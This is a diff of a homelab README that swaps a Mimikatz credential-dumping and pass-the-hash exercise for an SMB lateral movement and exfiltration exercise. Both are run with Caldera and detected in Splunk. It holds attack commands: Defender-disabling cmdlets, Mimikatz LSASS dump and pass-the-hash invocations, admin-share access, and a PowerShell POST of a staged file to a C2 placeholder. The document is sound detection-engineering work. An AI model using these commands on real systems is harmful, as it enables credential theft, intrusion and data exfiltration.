@@ -1,22 +1,22 @@
-# Credential Dumping via LSASS and Pass the Hash (Mimikatz)
+# SMB Lateral Movement & Data Exfiltration
 
-**Adversary emulation and detection engineering in a self-built SOC homelab.**
+**End-to-end kill-chain emulation and detection engineering in a self-built SOC homelab.**
 
-Emulated an attacker dumping credentials from LSASS memory using Mimikatz, then performing pass-the-hash lateral movement — with the attack intentionally obfuscated using base64 encoding to test detection resilience. Every detection is mapped to MITRE ATT&CK and validated against live attack telemetry.
+Emulated a full attack chain — lateral movement → data staging → exfiltration — using MITRE Caldera, then built behavior-based detections for each stage in Splunk from Windows Security logs and Suricata. Every detection is mapped to MITRE ATT&CK and validated against live attack telemetry.
 
-> **For reviewers:** the attack is the easy part. The value here is the detection engineering — catching credential dumping and pass-the-hash through behavior-based detections that survive obfuscation and tool renaming.
+> **For reviewers:** the attack is the easy part. The value here is the detection engineering — catching each stage by *behavior* rather than indicator, and choosing host telemetry over network signatures where it's more reliable.
 
 ---
 
 ## Objective
 
-Emulate an attacker who has achieved a foothold on a domain controller, dumps credentials from LSASS memory using Mimikatz, and uses the extracted NTLM hash to move laterally without ever knowing the plaintext password.
+Move laterally over SMB using reused credentials, stage a sensitive file with PowerShell, exfiltrate it over a C2 channel — and detect every stage in Splunk.
 
 | Stage | Technique | ATT&CK ID |
 |-------|-----------|-----------|
-| Credential Dumping | OS Credential Dumping: LSASS Memory | T1003.001 |
-| Pass the Hash | Use Alternate Authentication Material | T1550.002 |
-| Obfuscated Execution | Command and Scripting: PowerShell | T1059.001 |
+| Lateral Movement | SMB / Windows Admin Shares | T1021.002 |
+| Collection | Data Staged: Local Data Staging | T1074.001 |
+| Exfiltration | Exfiltration Over C2 Channel | T1041 |
 
 ---
 
@@ -24,171 +24,153 @@ Emulate an attacker who has achieved a foothold on a domain controller, dumps cr
 
 | Zone | Host | Role |
 |------|------|------|
-| Public | Kali | Attacker workstation + Caldera C2 (`:8888`) |
+| Public | Kali | Attacker workstation + Caldera C2 server (`:8888`) |
 | Perimeter | pfSense + Suricata | Firewall / inline IDS |
-| Private | DC (`x.x.x.250`) | Active Directory DC — **attack origin, LSASS target** |
-| Private | Win10 Client (`x.x.x.252`) | Domain workstation — **pass-the-hash destination** |
+| Private | DC (`x.x.x.250`) | Active Directory Domain Controller — **lateral-movement target** |
+| Private | Win10 Client (`x.x.x.252`) | Domain workstation — **attack origin** |
 | Private | Splunk | SIEM (indexer + search head) |
 | Infra | ESXi | Hypervisor |
 
-**Why the DC?** LSASS on a domain controller holds credentials for every account that has authenticated to the domain — it is the highest-value credential store in a Windows environment. Dumping it gives the attacker lateral movement anywhere in the domain.
+**Movement direction:** Win10 Client → DC. A workstation pivoting *into* a domain controller is the realistic, high-value attack path — admin-share access on a DC means the attacker already holds domain-level privileges.
 
-**Telemetry:** Sysmon ships EventID 1 (process creation) and Windows Security ships EventID 4688 (process creation with command line). All forwarded to Splunk via Universal Forwarder.
+**Telemetry:** Windows hosts ship Security logs to Splunk via Universal Forwarders; pfSense ships Suricata EVE JSON.
 
 ---
 
 ## Phase 0 — Setup (Prerequisites)
 
-### Disable Windows Defender on the DC
-Mimikatz is detected and quarantined by Defender before it executes. Disable real-time monitoring on the DC for the lab:
+These audit policies are **off by default**. Without them the events never generate and the detections return nothing — this is the #1 reason a lab "produces no data."
 
-```powershell
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
-```
-
-> In a real environment, attackers evade AV rather than disabling it. For the lab, disabling it keeps the focus on detection engineering rather than AV evasion.
-
-### Download Mimikatz manually on the DC
-Caldera's built-in `invoke-mimi.ps1` payload failed to load correctly, so Mimikatz was downloaded directly to disk and called by full path:
-
-```powershell
-Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -OutFile C:\Users\Public\mimikatz.zip
-Expand-Archive C:\Users\Public\mimikatz.zip -DestinationPath C:\Users\Public\mimikatz
-```
-
-### Enable audit policies on the DC
-`gpedit.msc` → Computer Config → Windows Settings → Security Settings → Advanced Audit Policy:
+**On both the DC and the Client** — `gpedit.msc` → Computer Config → Windows Settings → Security Settings → Advanced Audit Policy:
 
 | Subcategory | Setting | Generates |
 |-------------|---------|-----------|
+| Object Access → Audit File Share | Success | `5140` |
+| Object Access → Audit Detailed File Share | Success | `5145` |
 | Detailed Tracking → Audit Process Creation | Success | `4688` |
 
-Enable command-line logging: Admin Templates → System → Audit Process Creation → **"Include command line in process creation events"**. Then `gpupdate /force`.
+Also enable: Admin Templates → System → Audit Process Creation → **"Include command line in process creation events"** (or `4688` logs a blank command line). Then `gpupdate /force`.
 
-### Confirm Sysmon is running
-```powershell
-Get-Service sysmon64
-```
+**Confirm telemetry reaches Splunk before attacking:**
 
-### Confirm telemetry in Splunk
 ```spl
-index=* EventCode=4688 | head 5
-index=* EventCode=1 | head 5
+index=windows EventCode=4624 | head 5
+index=suricata | head 5
 ```
-
 
 ---
 
+<img width="1216" height="1036" alt="image" src="https://github.com/user-attachments/assets/38132a6d-5387-42d6-af03-340b7b560c22" />
+
+
 ## The Attack — MITRE Caldera
 
-The chain is built as two Caldera **abilities** sequenced in one **adversary profile**, run as a single **operation**.
+The chain is built as three Caldera **abilities**, sequenced into one **adversary profile**, then run as a single **operation** so the whole chain shares correlated timestamps.
 
-> An *ability* is a single attack action executed on a Sandcat agent. The agent beacons to the Caldera C2 on Kali and runs each ability in order. The attack was intentionally obfuscated using **base64 encoding** to simulate real-world evasion and test detection resilience.
+> An *ability* is a single attack action performed on an agent. Agents (Sandcat) are deployed on the hosts and beacon back to the Caldera C2 on Kali.
 
-<img width="1894" height="903" alt="image" src="https://github.com/user-attachments/assets/937cc9cf-52fb-45da-b31e-2ba571067c90" />
+<img width="1897" height="905" alt="image" src="https://github.com/user-attachments/assets/9b5e93c8-b616-4d20-932a-00596242730c" />
 
-
-### Ability 1 — Credential Dump (T1003.001)
-Mimikatz reads LSASS memory and extracts NTLM hashes for every account that has authenticated to the DC. Called by full path since the payload was downloaded manually. Executed first as a standalone operation to retrieve the hash before building Ability 2.
-
-```powershell
-C:\Users\Public\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-```
-<img width="1089" height="696" alt="image" src="https://github.com/user-attachments/assets/037c5870-f250-49f8-9b3b-0dfa635a12e1" />
-
-<img width="1670" height="623" alt="image" src="https://github.com/user-attachments/assets/37cec98e-923b-40cf-9592-3586e94f2493" />
-
-<img width="1672" height="796" alt="image" src="https://github.com/user-attachments/assets/9fcf4499-9217-49e6-a762-c10e8a482871" />
-
-<img width="1903" height="733" alt="image" src="https://github.com/user-attachments/assets/52974439-89ec-4f18-8489-9ccbb87b5cc0" />
-
-
-**Output:** Mimikatz successfully dumped NTLM hashes from LSASS. The Administrator hash was extracted from the output to use in Ability 2.
-
-<img width="527" height="136" alt="image" src="https://github.com/user-attachments/assets/e387a42c-e9b9-4c51-b26b-ea002931ccb9" />
-
-
-### Ability 2 — Pass the Hash (T1550.002)
-Uses the NTLM hash extracted in Ability 1 to spawn a new `cmd.exe` process with injected credentials — no plaintext password needed. The hash *is* the credential.
+### Ability 1 — Lateral Movement (T1021.002)
+Maps the DC's `ADMIN$` share from the client using reused domain credentials.
 
 ```powershell
-C:\Users\Public\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:LAB /ntlm:<hash>" exit
+net use \\<DC_IP>\ADMIN$ /user:LAB\Administrator <password>
 ```
+<img width="1161" height="745" alt="image" src="https://github.com/user-attachments/assets/5f1c47cd-1e6e-4c4e-b77f-d2dd82a62e0c" />
+<img width="1104" height="722" alt="image" src="https://github.com/user-attachments/assets/2ac5b2a6-f5ab-422c-ba4c-7ea0af449150" />
 
-<img width="1104" height="710" alt="image" src="https://github.com/user-attachments/assets/5689a012-cd9f-4934-af8e-01fcb744953b" />
 
-<img width="1114" height="719" alt="image" src="https://github.com/user-attachments/assets/12fb9de1-abd3-4d84-8b6d-eeeb1b286906" />
+### Ability 2 — Data Staging (T1074.001)
+Writes a decoy file onto the DC across the admin share.
+
+```powershell
+Set-Content -Path \\<DC_IP>\C$\Users\Public\sensitive.txt -Value 'SSN 000-00-0000 CC 4111111111111111'
+```
+<img width="1122" height="737" alt="image" src="https://github.com/user-attachments/assets/505571dc-615d-4b8d-a0f8-4d46ccc92e6c" />
+<img width="1111" height="732" alt="image" src="https://github.com/user-attachments/assets/0fe4371f-10a2-4c59-9667-2d430f32d2fe" />
+
+
+
+### Ability 3 — Exfiltration (T1041)
+Reads the staged file and sends it outbound to the C2.
+
+```powershell
+$f = Get-Content \\<DC_IP>\C$\Users\Public\sensitive.txt; Invoke-WebRequest -Uri http://<C2_IP>:8888/file/upload -Method POST -Body $f
+```
+<img width="1127" height="776" alt="image" src="https://github.com/user-attachments/assets/bf3e41cd-6fb1-4904-a990-8dcef4c8ec5a" />
+<img width="1135" height="774" alt="image" src="https://github.com/user-attachments/assets/84e0f6ab-f375-4d32-a069-52ab7c03cbfb" />
+
 
 
 ### Profile + Operation
-Both abilities chained in order: **Credential Dump → Pass the Hash**. Both ran successfully.
+Abilities created and chained into a profile in order: **Lateral Movement → Stage Decoy → Exfil** (order matters — staging must create the file before exfil reads it).
 
-<img width="1900" height="754" alt="image" src="https://github.com/user-attachments/assets/a297d202-5ef6-4429-ac6b-29454e367f79" />
+<img width="1675" height="745" alt="image" src="https://github.com/user-attachments/assets/3ff33acf-5c7e-4d09-9731-b99fa88d99c0" />
 
-<img width="1665" height="561" alt="image" src="https://github.com/user-attachments/assets/5f69c196-9903-4682-bb97-ab7075a7c802" />
 
-<img width="1509" height="733" alt="image" src="https://github.com/user-attachments/assets/101c2339-b7d2-4a04-88a4-ef11b3bac967" />
+**Operation result:** Lateral movement and staging succeeded. The exfil POST returned a `500` because Caldera's `/file/upload` endpoint expects multipart form-data, not a raw string body — but **the outbound request still left the host and crossed pfSense**, so it remains fully detectable. The blue-team objective is to detect the *attempt*, not to guarantee a clean upload.
 
-> **Note on obfuscation:** the commands were base64-encoded before execution to simulate an attacker hiding their actions. The encoded payload was later decoded using CyberChef to confirm what ran — this is standard threat hunting practice when command lines appear obfuscated in logs.
-<img width="1641" height="1034" alt="image" src="https://github.com/user-attachments/assets/bff95512-7265-4372-8545-cf5fcbb60af7" />
+<img width="1898" height="899" alt="image" src="https://github.com/user-attachments/assets/23a10a45-79b7-4c67-ae6a-904cbe36812f" />
+<img width="1898" height="900" alt="image" src="https://github.com/user-attachments/assets/c56833fa-fb20-4ac5-bf6a-de7cca991bbe" />
+<img width="1902" height="890" alt="image" src="https://github.com/user-attachments/assets/b15da28e-0329-4ff1-9df3-2f1709bde6db" />
+<img width="1630" height="739" alt="image" src="https://github.com/user-attachments/assets/7a886afa-92eb-4bcb-85cc-0412f320361a" />
+<img width="1647" height="493" alt="image" src="https://github.com/user-attachments/assets/508546ab-f589-404c-9448-1a32bf06e084" />
 
-<img width="1644" height="1034" alt="image" src="https://github.com/user-attachments/assets/12b46511-dd43-44ca-a49c-a2f19ee484cc" />
 
 ---
 
 ## Detection Engineering — Splunk
 
-Written with SPL only — search terms, fields, `table`, `sort`. No `eval`, `join`, or subsearches. MITRE mapping lives in the saved alert name. Alerts saved as real-time with throttle (suppress per host for 60 minutes) to avoid flooding.
+Written with **Splunk Core Certified User** SPL only — search terms, fields, `table`, `stats count`, `sort`. No `eval`, `join`, or subsearches. MITRE mapping lives in the saved-search name. (Splunk Free can't schedule alerts, so detections are saved as **reports**.)
 
-### 1. Mimikatz Process Creation — `Credential Access - Mimikatz Process Creation - T1003.001`
-
-Sysmon EventID 1 fires on every process creation. Filtering for `mimikatz.exe` in the image path catches the tool launching regardless of what command it ran.
-
-```spl
-index=* EventCode=1 Image="*mimikatz*"
-| table _time, host, User, Image, CommandLine, ParentImage
-| sort _time
-```
-
-<img width="1342" height="869" alt="image" src="https://github.com/user-attachments/assets/0680b3e2-7624-4d1b-8e4e-5819d2d5d412" />
-
-
-### 2. Encoded PowerShell Execution — `Credential Access - Encoded PowerShell Execution - T1059.001`
-
-Since the attack was base64-obfuscated, matching `sekurlsa` in the command line fails — that keyword is hidden inside the encoded blob. Instead, detect the **obfuscation flag itself**: `-enc` or `-EncodedCommand` signals that PowerShell is running an encoded command, which is suspicious regardless of what's inside it.
+### 1. Lateral Movement — `Lateral Movement - SMB ADMIN$ Access - T1021.002`
+EventID `5140` fires whenever a network share is accessed. Filtering for the hidden `ADMIN$` share isolates SMB lateral movement.
 
 ```spl
-index=* EventCode=4688 (Process_Command_Line="*-enc*" OR Process_Command_Line="*-EncodedCommand*")
-| table _time, host, Account_Name, New_Process_Name, Process_Command_Line
-| sort _time
+index=* EventCode=5140 Source_Address="x.x.x.252" Account_Name=Admin* Share_Name="\\*\ADMIN$" ComputerName="WIN-...lab.local"
+| stats count by Account_Name, Source_Address, ComputerName
 ```
+> The `Source_Address`/`ComputerName` filters scope this to the lab. A production rule drops them to catch admin-share access from **any** workstation to **any** target.
 
-> This is the upgraded detection — an attacker who obfuscates to evade keyword matching accidentally creates a new indicator. Detecting `-enc` is more resilient than detecting `sekurlsa` because the flag is required for the encoding to work.
+<img width="1405" height="900" alt="image" src="https://github.com/user-attachments/assets/808e044e-3f9e-4758-b6a7-c0590746e17a" />
+<img width="1386" height="893" alt="image" src="https://github.com/user-attachments/assets/c7cf121a-3df1-449d-a98c-49154c589c49" />
 
-<img width="1335" height="869" alt="image" src="https://github.com/user-attachments/assets/a4f9202a-0cd4-46d3-b576-b430d126d99f" />
 
-
-### 3. Pass the Hash Process Spawn — `Lateral Movement - Pass the Hash Process Spawn - T1550.002`
-
-`sekurlsa::pth` always spawns a child process (`cmd.exe`) with the injected credentials. Sysmon EventID 1 captures the parent-child relationship — `mimikatz.exe` as parent, `cmd.exe` as child. This fires the moment PtH executes, not when the credential is used, making it more reliable than waiting for a network logon event.
+### 2. Data Staging — `Collection - Remote Admin Share File Write - T1074.001`
+The attacker dropped `sensitive.txt` — but matching that filename would miss any other file. Instead, detect the **behavior**: a file being *written* to an admin share. `Access_Mask=0x2` (WriteData) only appears when a file is written to a `C$`/`ADMIN$` share, so this catches the staging regardless of filename.
 
 ```spl
-index=* EventCode=1 ParentImage="*mimikatz*" Image="*cmd.exe"
-| table _time, host, Image, ParentImage, CommandLine
+index=* EventCode=5145 Access_Mask=0x2 Share_Name="\\*\C$"
+| table _time, Account_Name, Source_Address, Relative_Target_Name, Share_Name
 | sort _time
 ```
+<img width="1389" height="887" alt="image" src="https://github.com/user-attachments/assets/2e76e204-7f1e-43d1-b4d1-4a1008e9f8d6" />
 
-<img width="1344" height="869" alt="image" src="https://github.com/user-attachments/assets/b10f4ea7-2e74-4d56-9449-ebecc3516371" />
+
+### 3. Data Exfiltration — `Exfiltration - PowerShell Outbound to C2 - T1041`
+Detected from the **host** rather than the IDS. `4688` process creation for `powershell.exe` with `Invoke-WebRequest` in the command line catches the outbound transfer — and the command line reveals the full exfil command and destination C2 URL.
+
+```spl
+index=* EventCode=4688 New_Process_Name="*powershell.exe*" Process_Command_Line="*Invoke-WebRequest*"
+| table _time, host, Account_Name, Process_Command_Line
+| sort _time
+```
+> **Why host-based, not Suricata?** Relying solely on the IDS is fragile — encryption or a custom C2 can evade signatures. The PowerShell process + outbound request on the endpoint is a more reliable, portable signal. Broaden with `*Invoke-RestMethod*`, `*Net.WebClient*`, or `*curl*` for other egress methods.
+
+<img width="1389" height="876" alt="image" src="https://github.com/user-attachments/assets/8c5053e5-61be-49af-a84c-f182e8bb7c21" />
+
+
+> **Field-name note:** `Share_Name`, `Source_Address`, `Access_Mask`, etc. come from the Splunk Add-on for Windows — adjust if your extractions differ.
 
 ---
 
 ## Detection Engineering Notes (Design Decisions)
 
-- **Detecting obfuscation over keywords.** Matching `sekurlsa` in the command line fails the moment an attacker base64-encodes the payload. Detecting `-enc`/`-EncodedCommand` instead catches the evasion technique itself — the flag is required for encoding to work and cannot be removed.
-- **Process spawn over network logon for PtH.** `sekurlsa::pth` injects credentials and spawns `cmd.exe` — that spawn happens regardless of whether the injected session ever touches the network. Detecting the parent-child relationship is more reliable and fires earlier than waiting for a `4624` logon event on a remote host.
-- **Behavior over tool name.** While Detection 1 matches `mimikatz.exe` by name, Detections 2 and 3 catch behaviors (`-enc` flag, suspicious process spawn) that survive binary renaming. A real detection ruleset uses both layers.
+Two deliberate choices that make these detections resilient rather than brittle:
+
+- **Behavior over indicator (staging).** Detecting `Access_Mask=0x2` on an admin share catches the *action* of staging a file. Matching the literal filename `sensitive.txt` would be trivially evaded by renaming. Indicators change; the technique doesn't.
+- **Host over network (exfil).** Catching the PowerShell outbound request on the endpoint survives encryption and custom C2 channels that would slip past a signature-based IDS. The IDS is a useful second layer, not the primary detection.
 
 ---
 
@@ -196,24 +178,21 @@ index=* EventCode=1 ParentImage="*mimikatz*" Image="*cmd.exe"
 
 | Detection | Technique | Source | Result |
 |-----------|-----------|--------|--------|
-| Mimikatz Process Creation | T1003.001 | Sysmon `EventID 1` | ✅ Detected |
-| Encoded PowerShell Execution | T1059.001 | Windows `4688` | ✅ Detected |
-| Pass the Hash Process Spawn | T1550.002 | Sysmon `EventID 1` | ✅ Detected |
+| SMB ADMIN$ Access | T1021.002 | Windows `5140` | ✅ Detected |
+| Remote Admin Share File Write | T1074.001 | Windows `5145` (Access_Mask 0x2) | ✅ Detected |
+| PowerShell Outbound to C2 | T1041 | Windows `4688` | ✅ Detected |
 
-All stages emulated via Caldera and independently detected in Splunk. Each saved as a real-time alert with throttle, re-validated by re-running the operation.
+All three stages were emulated via Caldera and independently detected in Splunk, each saved as a report and re-validated by re-running the operation.
 
-<img width="1897" height="906" alt="image" src="https://github.com/user-attachments/assets/e34868fa-c081-4a9c-917e-85cc0ffb2c3b" />
-
-<img width="1295" height="839" alt="image" src="https://github.com/user-attachments/assets/5b5f8720-59bb-4725-bdc0-2858f9e3d0d2" />
-
+<img width="1298" height="843" alt="image" src="https://github.com/user-attachments/assets/9b10f2dc-2d62-4265-aa06-951d67e9bf23" />
 
 ---
 
 ## Key Takeaways
 
-- Obfuscating the attack with base64 broke keyword-based detection but created a new indicator — the `-enc` flag itself.
-- Pass-the-hash is detectable at the moment of execution (process spawn) without needing a remote network connection to fire a logon event.
-- Mimikatz requires Defender disabled and local admin rights — both are prerequisites worth documenting because they reflect real attacker preconditions.
+- Built and detected a complete kill chain (lateral movement → staging → exfil) end to end.
+- Wrote behavior-based detections that survive indicator changes and evasion.
+- Demonstrated that a failed attack step (the exfil POST) is still detectable — what matters is the attempt crossing the wire.
 - Kept all SPL at Core level: readable, maintainable, explainable line by line.
 
 ---
